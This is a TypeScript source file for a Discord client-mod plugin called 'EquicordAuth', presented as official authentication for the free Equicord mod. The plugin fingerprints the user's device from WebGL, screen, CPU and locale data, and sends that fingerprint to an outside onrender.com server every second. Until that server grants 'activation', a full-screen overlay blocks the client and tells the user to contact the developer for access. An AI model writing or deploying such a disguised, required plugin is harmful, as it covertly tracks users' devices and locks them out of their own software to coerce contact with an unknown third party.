/*
 * Vencord, a Discord client mod
 * Copyright (c) 2024 Vendicated and contributors
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

import definePlugin from "@utils/types";

const SERVER_URL = "https://equicord-server.onrender.com";
import { Devs } from "@utils/constants";
const LOG_CHANNEL_ID = "1500181773152288799";
const SENT_KEY = "equicord_hwid_sent";

function getHWID(): string {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl");
    const debugInfo = gl?.getExtension("WEBGL_debug_renderer_info");
    const renderer = gl?.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL ?? 0) ?? "";
    const vendor = gl?.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL ?? 0) ?? "";

    const raw = [
        navigator.userAgent,
        navigator.language,
        screen.width,
        screen.height,
        screen.colorDepth,
        navigator.hardwareConcurrency,
        renderer,
        vendor,
        Intl.DateTimeFormat().resolvedOptions().timeZone,
    ].join("|");

    let hash = 0;
    for (let i = 0; i < raw.length; i++) {
        const char = raw.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }

    return `EQ-${Math.abs(hash).toString(16).toUpperCase().padStart(8, "0")}`;
}

function hasSentBefore(): boolean {
    return localStorage.getItem(SENT_KEY) === "true";
}

function markAsSent() {
    localStorage.setItem(SENT_KEY, "true");
}

async function sendHWIDToBot(hwid: string) {
    try {
        await fetch(`${SERVER_URL}/report`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ hwid, channelId: LOG_CHANNEL_ID })
        });
        markAsSent();
    } catch { }
}

function showBlockScreen(hwid: string) {
    if (document.getElementById("equicord-auth-block")) return;

    document.documentElement.style.overflow = "hidden";
    document.body.style.pointerEvents = "none";
    document.body.style.userSelect = "none";

    const style = document.createElement("style");
    style.id = "equicord-auth-style";
    style.textContent = `
        @keyframes twinkle {
            0%, 100% { opacity: 0.2; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.3); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-8px); }
        }
        @keyframes rotateLock {
            0%, 100% { transform: rotate(-3deg); }
            50% { transform: rotate(3deg); }
        }
        #equicord-auth-block {
            pointer-events: all !important;
            user-select: auto !important;
        }
        #equicord-copy-btn:hover {
            background-color: #4752c4 !important;
            transform: translateY(-2px) !important;
        }
        #equicord-send-btn:hover:not(:disabled) {
            background-color: #2d7c46 !important;
            transform: translateY(-2px) !important;
        }
        #equicord-copy-btn, #equicord-send-btn {
            transition: all 0.2s ease !important;
        }
    `;
    document.head.appendChild(style);

    // نجوم عشوائية
    let stars = "";
    for (let i = 0; i < 80; i++) {
        const x = Math.random() * 100;
        const y = Math.random() * 100;
        const size = Math.random() * 2.5 + 0.5;
        const delay = Math.random() * 4;
        const duration = Math.random() * 3 + 2;
        stars += `<div style="
            position: absolute;
            left: ${x}%;
            top: ${y}%;
            width: ${size}px;
            height: ${size}px;
            background: white;
            border-radius: 50%;
            animation: twinkle ${duration}s ${delay}s ease-in-out infinite;
        "></div>`;
    }

    const alreadySent = hasSentBefore();

    const div = document.createElement("div");
    div.id = "equicord-auth-block";

    div.innerHTML = `
        <div style="
            position: fixed;
            top: 0; left: 0;
            width: 100vw; height: 100vh;
            background: radial-gradient(ellipse at center, #0d0f14 0%, #000000 100%);
            z-index: 99999999;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: gg sans, Noto Sans, sans-serif;
            pointer-events: all;
            overflow: hidden;
        ">
            <!-- نجوم -->
            ${stars}

            <!-- الكارد -->
            <div style="
                background: rgba(15, 17, 22, 0.85);
                border-radius: 24px;
                padding: 48px 56px;
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 20px;
                max-width: 460px;
                width: 90%;
                box-shadow: 0 25px 80px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.06);
                backdrop-filter: blur(20px);
                animation: fadeIn 0.5s ease;
                position: relative;
                z-index: 1;
            ">
                <!-- أيقونة القفل SVG -->
                <div style="animation: float 4s ease-in-out infinite;">
                    <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <rect x="16" y="36" width="48" height="32" rx="8" fill="white" fill-opacity="0.95"/>
                        <rect x="22" y="42" width="36" height="20" rx="4" fill="#0d0f14"/>
                        <path d="M27 36V26C27 17.163 33.163 11 42 11C50.837 11 57 17.163 57 26V36" stroke="white" stroke-width="5" stroke-linecap="round" fill="none"/>
                        <circle cx="40" cy="52" r="4" fill="white"/>
                        <rect x="38.5" y="52" width="3" height="6" rx="1.5" fill="white"/>
                    </svg>
                </div>

                <div style="font-size: 28px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; text-align: center;">
                    Not Activated
                </div>

                <div style="font-size: 14px; color: rgba(255,255,255,0.5); text-align: center; line-height: 1.7;">
                    This version of Equicord is not activated on your device.<br/>
                    Contact the developer to get access.
                </div>

                <div style="
                    background: rgba(255,255,255,0.04);
                    border-radius: 12px;
                    padding: 14px 24px;
                    font-family: monospace;
                    font-size: 20px;
                    color: rgba(255,255,255,0.15);
                    letter-spacing: 6px;
                    border: 1px solid rgba(255,255,255,0.08);
                    width: 100%;
                    text-align: center;
                ">★ ★ ★ ★ ★ ★ ★ ★</div>

                <div style="display: flex; gap: 10px; width: 100%;">
                    <button id="equicord-copy-btn" style="
                        background: rgba(88, 101, 242, 0.9);
                        color: #ffffff;
                        border: none;
                        border-radius: 12px;
                        padding: 13px 0;
                        font-size: 14px;
                        font-weight: 600;
                        cursor: pointer;
                        flex: 1;
                        pointer-events: all;
                    ">Copy HWID</button>

                    <button id="equicord-send-btn" ${alreadySent ? "disabled" : ""} style="
                        background: ${alreadySent ? "rgba(255,255,255,0.08)" : "rgba(36, 128, 70, 0.9)"};
                        color: ${alreadySent ? "rgba(255,255,255,0.3)" : "#ffffff"};
                        border: none;
                        border-radius: 12px;
                        padding: 13px 0;
                        font-size: 14px;
                        font-weight: 600;
                        cursor: ${alreadySent ? "not-allowed" : "pointer"};
                        flex: 1;
                        pointer-events: all;
                    ">${alreadySent ? "✅ Already Sent" : "Send to Developer"}</button>
                </div>
            </div>
        </div>
    `;

    document.body.appendChild(div);

    document.getElementById("equicord-copy-btn")?.addEventListener("click", () => {
        navigator.clipboard.writeText(hwid);
        const btn = document.getElementById("equicord-copy-btn");
        if (btn) {
            btn.textContent = "✅ Copied!";
            setTimeout(() => { btn.textContent = "Copy HWID"; }, 2000);
        }
    });

    document.getElementById("equicord-send-btn")?.addEventListener("click", async () => {
        if (hasSentBefore()) return;
        const btn = document.getElementById("equicord-send-btn") as HTMLButtonElement;
        if (btn) {
            btn.textContent = "Sending...";
            btn.disabled = true;
            await sendHWIDToBot(hwid);
            btn.textContent = "✅ Sent!";
            btn.style.background = "rgba(255,255,255,0.08)";
            btn.style.color = "rgba(255,255,255,0.3)";
            btn.style.cursor = "not-allowed";
        }
    });
}

function removeBlockScreen() {
    const el = document.getElementById("equicord-auth-block");
    const style = document.getElementById("equicord-auth-style");
    if (el) {
        el.remove();
        style?.remove();
        document.documentElement.style.overflow = "";
        document.body.style.pointerEvents = "";
        document.body.style.userSelect = "";
    }
}

export default definePlugin({
    name: "EquicordAuth",
    description: "Equicord Authentication",
    authors: [Devs.unknown],
    required: true,

    hwid: "",
    intervalId: null as any,

    async start() {
        this.hwid = getHWID();
        await this.checkActivation();
        this.intervalId = setInterval(() => this.checkActivation(), 1000);
    },

    stop() {
        if (this.intervalId) clearInterval(this.intervalId);
        removeBlockScreen();
    },

    async checkActivation() {
        try {
            const res = await fetch(`${SERVER_URL}/check/${this.hwid}`);
            const data = await res.json();
            if (data.activated) {
                removeBlockScreen();
            } else {
                showBlockScreen(this.hwid);
                if (!document.getElementById("equicord-auth-block")) {
                    showBlockScreen(this.hwid);
                    document.body.style.pointerEvents = "none";
                    document.documentElement.style.overflow = "hidden";
                }
            }
        } catch { }
    },
});
